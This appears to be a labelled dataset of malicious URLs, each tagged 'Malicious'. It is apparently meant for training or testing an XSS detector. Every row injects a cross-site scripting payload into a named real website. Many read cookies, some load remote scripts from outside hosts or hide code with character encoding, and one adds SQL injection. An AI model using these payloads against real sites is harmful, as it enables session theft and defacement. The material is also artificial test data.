http://guestbook.cpu.edu.ph/cpubook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.africom.mil/fetchbinary.asp?pdfid=20071121085732;update%20sysobjects%20set%20name='asd'--<br>&lt;script&gt;alert('also has sql lets hack it :p')&lt;/script&gt;,Malicious
https://support.skype.com/fr/search/?q=conference+calls%22%3e%3c/title%3e%3ciframe%20src=,Malicious
http://www.thematiques.modernisation.gouv.fr/acc_page.php?id=1%27%27%22%3e%3c/title%3e%3cscript%3eal<br>ert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by,Malicious
http://www.avast.com/download-thank-you.php?src=http://files.avast.com/iavs5x/setup_av_free.exe--%3e<br>%22%3e'%3e'%22%3cscript%3econfirm(/best%20regards%20from%20bulgaria/)%3c/script%3e&amp;product=fa-avast&amp;<br>page=free-antivirus-download&amp;locale=en-ww&amp;avast=0,Malicious
http://kurdewari.com/default.asp?sf=urunlst&amp;anna=88&amp;altktg=317&amp;annaad=&quot;&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
http://iphone.cnet.com/site?sid=cnet_ip&amp;pid=search&amp;searchtxt=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3b<br>b%3dalert%3ba(b(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+<br>xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www4.army.mil/news/standto.php?dte=2009-02-13%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.isarte.it/index.html?module=htp.tdir&amp;op=dosearch&amp;profile=lucenesearch&amp;hint_channel=1&amp;hint<br>_visibility=1000&amp;query=%22%3e%3cimg+src%3d%22http%3a%2f%2fimg96.imageshack.us%2fimg96%2f8009%2fxssks<br>5.jpg%22%3e,Malicious
http://www.productivitycard.com/_productivity/bordercross.asp?dest=www.mastercard.com/us/specialoffe<br>rs/savings_discounts/index.html}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script<br>%3e%27%22%3e%3cmarquee%3e%3ch1%3e%22%3e%3cscript%3ealert(%22test%22)%3c/script%3e%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://www.mtv.com/sitewide/droplets/sectionsetupfiles/personalizationjs.jhtml?thisurl=&quot;&gt;&lt;script&gt;ale<br>rt(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://income.com.sg/search/advsearch.asp?target=ptd&amp;rc=10&amp;drpcategory=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/scr<br>ipt&gt;,Malicious
"http://www.csail.mit.edu/search/node/&lt;script&gt;document.write(string.fromcharcode(60, 83, 67, 82, 73,<br>80, 84, 32, 83, 82, 67, 61, 104, 116, 116, 112, 58, 47, 47, 102, 111, 117, 108, 100, 105, 110, 105,<br>46, 99, 111, 109, 47, 120, 115, 115, 46, 106, 115, 62, 60, 47, 83, 67, 82, 73, 80, 84, 62))&lt;/script&gt;",Malicious
"http://marqueetheatre.ticketforce.com/orderticketsarea.asp?p=569&amp;a=249&amp;backurl=';alert(string.fromch<br>arcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//<br>\&quot;;alert(string.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83)<br>)&lt;/script&gt;",Malicious
http://www.modahaber.com/index.php?go=katalog_detay&amp;katalog_id=43101&amp;id=%22%3e%3cscript+src=http://v<br>uln.xssed.net/thirdparty/scripts/ckers.org.js%3e,Malicious
http://jmobile.ddo.jp/?mode=afflist&amp;start=80'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://tv.msn.co.kr/enter/tvholic/scene_board/tv_scene_view.html?idx=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.axa.com.ph/contact_us-complaints.asp?subj=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower<br>%20-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;,Malicious
http://sbsq.saic.gov.cn/ef/doc/template.jsp?url=%22%3e%3c/iframe%3e%3ciframe%20src=/%3e,Malicious
http://benq.ch/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.nic.pe/nic_reg_registrar_dominios.php?hdnaccion=mostrarcombinaciones&amp;dom_ini=%27/%3e%3c/<br>td%3e%3cscript%3ealert(/xss/)%3c/script%3e&amp;dom_fin=.pe&amp;buscar.x=0&amp;buscar.y=1,Malicious
http://www.diy.com/diy/jsp/bq/nav/nav.jsp?issearch=true&amp;fh_search=%22%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e,Malicious
http://www.polycontrols.com/info.php?content=contact&amp;lang=fr-ca/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://dsb.z-online.ch/dsb_anbieter_03_popup.asp?cam=e31r&amp;pagetitle=&lt;script&gt;alert(&quot;scriptorium(turke<br>y)&quot;)&lt;/script&gt;,Malicious
http://www.uscis.gov/portal/site/uscis/menuitem.5af9bb95919f35e66f614176543f6d1a/?vgnextoid=31b3ab0a<br>43b5d010vgnvcm10000048f3d6a1rcrd&amp;vgnextchannel=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scrip<br>t%3e,Malicious
http://www.ectswsr.com.au/register.php?id=24%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://elperiodico.com/buscador.asp?criteri=algo%22/%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.toute-option.tv/toute-option/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281<br>%29%3c/script%3e,Malicious
http://tinypic.com/shareiframe.php?hex=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%<br>72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%3<br>1%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31<br>%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;i=19&amp;ext=,Malicious
http://tnetsixenon.xrea.jp/rnote/?d=2006%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://salsavictoria.bc.ca/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://app.answersplease.dc.gov/services/resources/searchresults.asp?radword=any&amp;radsearchtype=keywo<br>rd&amp;txttitle=&amp;selward=0&amp;txtaddress=&amp;intpg=1&amp;intotherpg=1&amp;sx=0&amp;sy=0&amp;intward=0&amp;selkeyword='%3e%22%3e%3c<br>script/src=http://kusomiso.com/xss.js%3e%3c/script%3ewidows,Malicious
http://www.seatoseaschool.com/gallery2/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.aurelian.ro/login_form.asp?backurl=%22%3e%3cscript%3ealert('by-panzerturk')%3c/script%3e,Malicious
http://members.freewebs.com/relogin.jsp?tokenaction=%22%3e%3ciframe%20src=http://google.com%3e%3c/if<br>rame%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.eneriance.fr/actualites.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.asc-bobingen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sporakademisi.com/kazananlar/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.online-ergonomics.co.uk/shop/shop-search.php?searchterm=&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://www.bbc.co.uk/mediaselector/check//turkish/meta/dps/2007/01/070105_pelosi?size=au&amp;bgc=003399&amp;<br>lang=tr&quot;;&lt;/script&gt;&lt;script&gt;alert('by-panzerturk');&lt;/script&gt;&lt;/a&gt;&lt;&amp;nbram=1&amp;nbwm=1&lt;/a&gt;,Malicious
http://livescore.goal.com/index.php?language=%22%20%27%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.bobparsons.me/index.php?isc=u&amp;ci=13338&amp;id=-1&amp;targetguid=%22%3e%3cscript%3ealert%28documen<br>t.cookie%29%3c/script%3e,Malicious
http://www.torrent411.com/torrents-search.php?search=%22%3e%3cscript%3ealert(%2fxss+by+warvector+!%2<br>f)%3b%3c%2fscript%3e%3ca+href%3dhttp%3a%2f%2fwarvector-xssed.tk%3e%3cimg+src%3dhttp%3a%2f%2fwarvecto<br>r.u7n.org%2fimages%2flogo.gif%3e%3cmarquee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3<br>e&amp;cat=0&amp;submit.x=0&amp;submit.y=0&amp;cat=0,Malicious
http://fi.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.turkishdailynews.com.tr/search.php?q=http://www.turkishdailynews.com.tr/article.php?enews<br>id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.babynamenetwork.com/baby_names/alphabetical/c.cfm?gender=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.worth1000.com/galleries.asp?list=%22%3e%3cscript%3ealert(%22by%20encore%20!%22)%3c/script<br>%3e,Malicious
http://www.ruralni.gov.uk/search.jsp/search.lsim?ha=dard%27%22%3e%3c/title%3e%3cscript%3ealert(1337)<br>%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eni2&amp;qt=milk,Malicious
http://boston.redsox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy was here');&lt;/script&gt;,Malicious
http://phonebook.adamswells.com/results.php?cmd=1&amp;name=%3cimg+%22%22%22%3e%3cscript%3ealert(%22resis<br>tance%22)%3c%2fscript%3e%22%3e&amp;city=all&amp;x=0&amp;y=0,Malicious
http://community.godaddy.com/forums?isc=&lt;/script&gt;&lt;body<br>onload=alert(/lulz/)&gt;&lt;script/src=//z.l.to&gt;&lt;/script&gt;&lt;plaintext&gt;,Malicious
http://buscador.telefonica.es/jsp/cdoresult.jsp?querytype=32&amp;querytxt=a%27%3e%3cscript%3ealert%28%27<br>norehem+was+here%27%29%3b%3c%2fscript%3e%3cb&amp;querylevel=2&amp;sesion=a&amp;nomlib=telefonica|salaprensa_lib|<br>grupo_fundaciontelefonica|grupo_telefonicaonline|grupo_telefonicadata|grupo_cabitel|grupo_telyco|gru<br>po_telefonicaid|grupo_terra|grupo_telefonicamoviles&amp;querystring=&amp;idiom=&amp;fileini=default&amp;saladeprensa<br>=&amp;pais=es,Malicious
http://www.booksandcollectibles.com.au/bsearch.php3?bsearch_submit=search&amp;auth=%22%3e%3ciframe+src%3<br>djavascript%3aalert(123)%3e&amp;title=&amp;pub=&amp;sub=&amp;sort_by=author&amp;block_size=20&amp;country=00,Malicious
http://www.guerrero.gob.mx/?p=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/script%3e&amp;a<br>rtorder=readart&amp;article=1040,Malicious
http://music.msn.co.kr/genre/genre_sub.html?na_t=4&amp;na_m=9&amp;genre_code=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www4.symantec.com/events/controller?c=srch&amp;fn=search&amp;simple=y&amp;text=totalschaden%3cscript%3eal<br>ert(%22security? wtf? -<br>totalschaden%22)%3c/script%3e&amp;cid=aaa&amp;aud=-99&amp;sids=-99&amp;simple=y&amp;countryid=&amp;audiancetext=&amp;solutiontex<br>t=&amp;eventtypetext=&amp;producttext=&amp;ln=en_us&amp;citytext=,Malicious
http://www.vulcaodepocos.com.br/album/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.compucom.com/search/results.aspx?q=%3cscript%3ealert(%27xss%27)%3c/script%3e,Malicious
http://offer.van.fedex.com/m/p/fdx/drv/reg.asp?cc=%22%3e%3cscript%3ealert%28document.cookie%29%3c/sc<br>ript%3e,Malicious
http://www.3mori.co.jp/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn<br>.eu%27%29%3c%2fscript%3e,Malicious
http://www.sitesearchasp.net/sitesearchasp.net/engine.aspx?searchconfiguration=7467bd60741a418ab8d16<br>254b8cd0b3335f31aebf480f6ade16829684f0127622b2a336a99b9785b006474e69f4b58b0b85e8c3fcd9999a5096893637<br>774e778ccbde8349f717fe03274e2f7384ef58fffd0042c75a6fa18c964309cd48cb81994215a464ea69639ccb78c2d9955b<br>c6d00dc5ead4b0d66a6e563f3a59d73064b913f5c013554c77bde3fb25c7ea3918a191da1dd5d390c64c5a379cbaca420e84<br>4ec765d2045e26bea14b506bc43c8ace836a882c6f0be2ecf13cf02a6cc9dd50d20d4b445c7afe3df2ff0633ffdf3db096b0<br>7ceb592fc1a3da80ffb39380b1de61fe3680aed7beba8705ce2428d9dcc0330b81ffca4cd1c&amp;searchterm=%3d%22%3e%3cs<br>cript%3ealert%28%270ssi3_tr%27%29%3c/script%3e,Malicious
http://www.areaimmobiliare.org/indice/default.asp?search=%22%3cscript%3ealert(%22found%20by%20hotpoc<br>kets%20of%20backslashsecurity.org%22)%3c/script%3e,Malicious
http://www.tbilliards.com/photogallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sporx.com/detail.php?type=search&amp;frm_kategori=haber&amp;frm_text=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&amp;sayfa=1&amp;x=0&amp;y=0,Malicious
https://www.meted.ucar.edu/search/search_results.php?hq=site%3ameted.ucar.edu&amp;cx=0124460524738639029<br>91%3ar8nkgnwzzsc&amp;cof=forid%3a11&amp;q=%22%3e%3cscript%3ealert%28%2far3sw0rmed%2f%29%3b%3c%2fscript%3e,Malicious
http://www.vesoul-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://jimaku.in/gate?mode=check&amp;email=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%<br>72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%3<br>1%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31<br>%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;id=&amp;nickname=&amp;password=&amp;password_chk=,Malicious
http://www.fiat.fr/cgi-bin/pbrand.dll/fiat_france/search/search.jsp?currentpage=0&amp;h_to_search=%3cscr<br>ipt%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;makeserach=&amp;psource=&amp;bv_sessionid=%40%40%40%400146017184.1<br>201702842%40%40%40%40&amp;bv_engineid=cccfadedejdghjlcefecejgdfkhdfjk.0&amp;to_search=%3cscript%3ealert%28%2<br>7xss%27%29%3c%2fscript%3e,Malicious
http://register.paltalk.com/reg/palregister.jsp?pagc=115&amp;advc=105&amp;refc='%3e%22%3e%3cscript/src=http:<br>//kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.zvirtual.com/catalog2.asp?category=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmar<br>quee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://arcade.games.myway.com/game.htm?code=111956893&amp;refid=1000'%3e%22%3e%3cscript/src=http://kusom<br>iso.com/xss.js%3e%3c/script%3e,Malicious
http://search.pmo.gov.my/i/?p=%3c/title%3e%3cscript%3ealert('l')%3c/script%3e,Malicious
http://www.loanuncias.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ipmart-forum.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://search.chinabyte.com/search.do?wd=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c<br>121%2c32%2c107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e&amp;<br>btnsearch.x=28&amp;btnsearch.y=9&amp;btnsearch=%cb%d1%cb%f7,Malicious
http://www.wankspider.com/search?q=%22%3e%3cbody%2fonload%3dalert(%2fxss%2f)%3e,Malicious
http://search.ca.com/search/ca?style=en&amp;search_button=search&amp;qt=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script<br>&gt;&amp;col=,Malicious
"http://www1.conrad.de/scripts/wgate/zcop_b2c/?~template=pcat_area_s_browse&amp;mfhelp=&amp;p_selected_area=%<br>24root&amp;p_selected_area_fh=&amp;perform_special_action=&amp;glb_user_js=y&amp;shop=b2c&amp;vgl_artikel_in_index=&amp;prod<br>uct_show_id=&amp;p_page_to_display=%22;/%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e<br>%3cmeta&amp;~cookies=1&amp;zhmmh_lfo=&amp;zhmmh_area_kz=&amp;s_haupt_kategorie=&amp;p_searchstring=&amp;p_searchstring_artnr<br>=&amp;p_search_category=alle&amp;r3_matn=&amp;insert_kz=&amp;gvlon=&amp;area_s_url=&amp;brand=&amp;amount=&amp;new_item_quantity=&amp;ar<br>ea_url=&amp;direkt_aufriss_area=&amp;p_countdown=&amp;p_80=&amp;p_80_category=&amp;p_80_article=&amp;p_next_template_after_l<br>ogin=&amp;mindestbestellwert=&amp;login=&amp;password=&amp;bpemail=&amp;bpid=&amp;url=&amp;show_wk=&amp;use_search=3&amp;p_back_template<br>=&amp;template=&amp;kat_save=&amp;updatestr=&amp;vgl_artikel_in_vgl=&amp;titel=&amp;darsteller=&amp;regisseur=&amp;anbieter=&amp;genre=&amp;<br>fsk=&amp;jahr=&amp;jahr2=&amp;dvd_error=x&amp;dvd_empty_error=x&amp;dvd_year_error=&amp;call_dvd=&amp;kna_news=&amp;p_status_scenari<br>o=&amp;documentselector=&amp;aktiv=&amp;p_load_area=$root&amp;p_artikelbilder_mode=&amp;p_sortopt=&amp;page=&amp;p_catalog_max_r<br>esults=20",Malicious
http://search.orange.co.uk/all?q=%22%3c/title%3e%3e%3cscript%3ealert(1)%3c/script%3etest,Malicious
http://clarksonathletics.com/news/gen/2003/10/13/frenchie's.asp?path=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.miniclip.com/php/en/search_results.php?query=%22%22%3e%3cscript%3ealert%28%22scr34m%22%29<br>%3b%3c%2fscript%3e,Malicious
http://www.babylon-x.com/preview/monica_bellucci.php?id=2104&amp;site=14&amp;csp=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;<br>/script&gt;,Malicious
http://www.openlab.cn/cgi-bin/forums.cgi?forum=1%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%3<br>7%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39<br>%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.bfb-cipi.ch/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3<br>ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.russas.ce.gov.br/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3eale<br>rt(document.cookie)%3c/script%3e,Malicious
http://ancienthistory.about.com/sitesearch.htm?terms=asd&amp;suname=%22%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious
"http://club.book.csdn.net/people/morelist.aspx?username=bookread%22%3e'%3e%3cscript%3ealert(string.f<br>romcharcode(88,83,83,32,66,121,32,107,117,115,111,109,105,115,111,46,111,109))%3c/script%3e",Malicious
http://www.treasury.gov.tr/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;al<br>ert(&quot;818&quot;)&lt;/script&gt;,Malicious
http://search.xanga.com/searchxanga.aspx?q=%22%3e%3cscript%3ealert%28%27i-landet%27%29%3c/script%3e,Malicious
http://timeline.grc.nasa.gov/index.cfm?&amp;id=312&amp;fuseaction=detail.print%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.buy.xxx/index.php?domain=%3c/script%3e%3cimg%20src=1.gif%20onerror=alert%281337%29%3e,Malicious
"http://www.telecom.gouv.fr/recherche.php3?recherche=';alert(string.fromcharcode(83,69,67,85,82,73,84<br>,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,8<br>2,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
https://registration.ft.com/registration/login/forgottenpassword?location=&quot;&gt;&lt;script&gt;alert('xss')&lt;/sc<br>ript&gt;&lt;meta content=&quot;,Malicious
http://www.intouchparenting.co.za/index.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e,Malicious
"https://www.banking.us.hsbc.com/map_plotter.jsp?streetaddress=%22%27%3cscript%3ealert(string.fromcha<br>rcode(88,115,115,101,100,32,98,121,32,80,105,101,114,114,101,32,71,97,114,100,101,110,97,116))%3c/sc<br>ript%3e",Malicious
http://www.engnetbase.com/ejournals/authentication/login.asp?showheader=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.censusdata.abs.gov.au/absnavigation/prenav/productselect?textversion=false&amp;areacode=&quot;&gt;&lt;sc<br>ript&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.instructables.com/account/login?nxtpgname=%22/%3e&lt;iframe<br>src=http://google.com&gt;&lt;/iframe&gt;&lt;script src=http://ha.ckers.org/xss.js?/&gt;,Malicious
http://www.cheatscodesworld.com/search.html?query=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://pc.happymail.co.jp/index_2.php?log=%22%3e'%3e%3c/iframe%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e,Malicious
http://recherche.yagoort.org/search.html?q=%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scripts/<br>hotpockets.js%3e,Malicious
http://zazachat.zazasoftware.com/livechatclient/livechatvisitor.aspx?zzwindow=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie);&lt;/script&gt;&amp;zazac=8007,Malicious
https://www.ippc.int/ipp/fr/default_fr.jsp?language=fr%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e,Malicious
http://www.fedhorecavlaanderen.be/homepage.asp?id=1&amp;menu_key=%22%3e%3cscript%3ealert(%22maxwel%22)%3<br>c/script%3e,Malicious
http://www.minipom-forum.eu/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mario-online.com/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][]=%3cscript%20src=http://hiphopshare.xm.com/xss.js,Malicious
http://www1.ntv.co.jp/mobile/weblog/index.cgi?id=13&amp;mode=individual&amp;no=3'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3e&amp;eid=2023,Malicious
http://www.fucz.gov.ba/fucz/bosanski/novosti/img_prikaz.php?img=1_mart&amp;img_title=%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e,Malicious
http://www.vodafone.cz/search/index.htm?must=%22%3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;sear<br>ch-submit=%22%3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;stype=simple&amp;menu_type=%22%3cscript%3ea<br>lert%28%22xssed%22%29%3c/script%3e,Malicious
http://www.rexmitchell.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.trainingshop.ru/rus/shop/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-un<br>ity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://msn.cellus.no/?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;<br>&lt;/marquee&gt;,Malicious
http://lt.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.cbr.ru/eng/ostat_base/main.asp?depo=yes'%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scri<br>pt%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://usa.autodesk.com/adsk/servlet/usearch/results?la=en&amp;nh=10&amp;col=usuppprd&amp;col=wacjprd&amp;siteid=123<br>112&amp;catid=123155&amp;id=2088334&amp;qt=--&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;x=0&amp;y=0,Malicious
http://www.getacoder.com/projects/home_page_subcategories_0.htm?t=%22%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e&amp;b=0,Malicious
http://www.nhtsa.dot.gov/cps/cpsfitting/findfitting.cfm?q_zip='%3e%22%3e%3cscript/src=http://kusomis<br>o.com/xss.js%3e%3c/script%3e,Malicious
http://bahrainevents.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://tv.detik.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://bolivar.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
http://www.kukly.eu/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
